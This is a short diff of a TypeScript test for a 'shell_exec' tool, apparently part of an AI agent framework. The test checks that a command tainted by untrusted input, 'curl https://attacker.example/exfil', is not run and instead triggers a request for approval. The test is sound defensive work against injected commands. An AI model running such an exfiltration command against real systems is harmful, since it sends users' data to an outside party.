@@ -58,7 +58,7 @@ describe('shell_exec', () => {
             logger: { warn: () => {} },
             hostBreaker: new HostBreaker(),
             taintedByUntrustedInput: true,
-        } as any
+        } as never
         const out = await exec(ctx, run, 'curl https://attacker.example/exfil')
         expect(run).not.toHaveBeenCalled()
         expect(out).toMatch(/request_approval/i)
